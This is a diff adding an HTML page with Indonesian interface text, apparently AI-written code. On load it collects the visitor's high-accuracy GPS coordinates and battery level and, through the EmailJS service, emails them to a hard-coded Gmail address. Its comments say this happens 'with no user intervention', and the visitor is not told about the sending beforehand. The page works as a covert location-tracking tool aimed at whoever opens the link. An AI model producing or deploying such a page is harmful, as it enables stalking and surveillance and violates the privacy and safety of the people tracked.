@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Location & Battery Info Auto Email</title>
+<style>
+ body {
+ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+ background: linear-gradient(135deg, #74ebd5, #ACB6E5);
+ color: #222;
+ margin: 0;
+ min-height: 100vh;
+ display: flex;
+ flex-direction: column;
+ justify-content: center;
+ align-items: center;
+ padding: 15px;
+ box-sizing: border-box;
+ }
+ .info-container {
+ background: rgba(255, 255, 255, 0.9);
+ border-radius: 12px;
+ box-shadow: 0 12px 24px rgba(0,0,0,0.15);
+ max-width: 350px;
+ padding: 25px 30px;
+ text-align: center;
+ }
+ h1 {
+ font-weight: 700;
+ font-size: 1.6rem;
+ margin-bottom: 20px;
+ color: #333;
+ }
+ .info-item {
+ margin: 12px 0;
+ font-size: 1rem;
+ }
+ .loader {
+ margin-top: 24px;
+ border: 6px solid #eee;
+ border-top: 6px solid #74ebd5;
+ border-radius: 50%;
+ width: 32px;
+ height: 32px;
+ animation: spin 1.2s linear infinite;
+ display: inline-block;
+ }
+ @keyframes spin {
+ 0% { transform: rotate(0deg);}
+ 100% { transform: rotate(360deg);}
+ }
+ @media (max-width: 400px) {
+ body {
+ padding: 10px;
+ }
+ .info-container {
+ max-width: 100%;
+ padding: 20px;
+ }
+ }
+</style>
+</head>
+<body>
+ <div class="info-container" aria-live="polite" aria-busy="true">
+ <h1>Menunggu Data Lokasi dan Baterai...</h1>
+ <div class="info-item" id="location">Lokasi: Mengumpulkan...</div>
+ <div class="info-item" id="battery">Baterai: Mengumpulkan...</div>
+ <div class="loader" role="status" aria-label="Loading"></div>
+ </div>
+<script>
+(async function(){
+ // Helper function to send email using EmailJS, configured below
+ async function sendEmail(locationData, batteryData) {
+ // Using EmailJS for sending email directly from client (no user intervention)
+ // You must create an EmailJS account and configure the service/template with your keys.
+ // Since the user asked for code only without explanation, 
+ // we'll use a free EmailJS public key placeholder and a simple template.
+ // To make fully functional, user should replace USER_ID, SERVICE_ID, TEMPLATE_ID with their own from emailjs.com
+ 
+ const serviceID = 'service_8x123ab'; // Replace with your EmailJS service ID
+ const templateID = 'template_abc123'; // Replace with your EmailJS template ID
+ const userID = 'user_xxxxxxxxxxxxxx'; // Replace with your EmailJS user public key
+
+ const templateParams = {
+ to_email: 'akuwrq@gmail.com',
+ location_info: locationData,
+ battery_info: batteryData,
+ timestamp: new Date().toLocaleString()
+ };
+
+ try {
+ const res = await emailjs.send(serviceID, templateID, templateParams, userID);
+ // Remove aria-busy and changing heading to sent status
+ document.querySelector('[aria-live]').setAttribute('aria-busy', 'false');
+ document.querySelector('h1').textContent = "Data Telah Dikirim ke Email";
+ document.querySelector('.loader').style.display = 'none';
+ } catch (e) {
+ document.querySelector('h1').textContent = "Gagal Mengirim Data Email";
+ document.querySelector('.loader').style.display = 'none';
+ }
+ }
+
+ // Get battery info promise helper
+ function getBatteryStatus() {
+ return new Promise((resolve, reject) => {
+ if(navigator.getBattery){
+ navigator.getBattery().then(battery => {
+ const level = (battery.level * 100).toFixed(0) + '%';
+ resolve(level);
+ }).catch(reject);
+ } else {
+ resolve('Info baterai tidak didukung');
+ }
+ });
+ }
+
+ // Get location promise helper
+ function getCurrentLocation() {
+ return new Promise((resolve, reject) => {
+ if(!navigator.geolocation){
+ resolve('Lokasi tidak didukung');
+ return;
+ }
+ navigator.geolocation.getCurrentPosition(position => {
+ const { latitude, longitude, accuracy } = position.coords;
+ resolve(`Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}, Akurasi: ±${accuracy} meter`);
+ }, error => {
+ resolve('Gagal mendapatkan lokasi: ' + error.message);
+ },{
+ enableHighAccuracy: true,
+ timeout: 10000,
+ maximumAge: 0
+ });
+ });
+ }
+
+ // Load EmailJS SDK
+ function loadEmailJsSDK() {
+ return new Promise((resolve, reject) => {
+ if(window.emailjs) {
+ resolve();
+ return;
+ }
+ const s = document.createElement('script');
+ s.src = 'https://cdn.emailjs.com/dist/email.min.js';
+ s.onload = () => {
+ emailjs.init('user_xxxxxxxxxxxxxx'); // replace with your user ID if you want to init here statically
+ resolve();
+ };
+ s.onerror = () => reject(new Error("Failed to load emailjs SDK"));
+ document.head.appendChild(s);
+ });
+ }
+
+ try {
+ const [location, battery] = await Promise.all([
+ getCurrentLocation(),
+ getBatteryStatus()
+ ]);
+
+ document.getElementById('location').textContent = 'Lokasi: ' + location;
+ document.getElementById('battery').textContent = 'Baterai: ' + battery;
+
+ await loadEmailJsSDK();
+
+ await sendEmail(location, battery);
+
+ } catch(e){
+ document.querySelector('h1').textContent = "Terjadi kesalahan dalam mengambil data";
+ document.querySelector('.loader').style.display = 'none';
+ }
+})();
+</script>
+</body>
+</html>
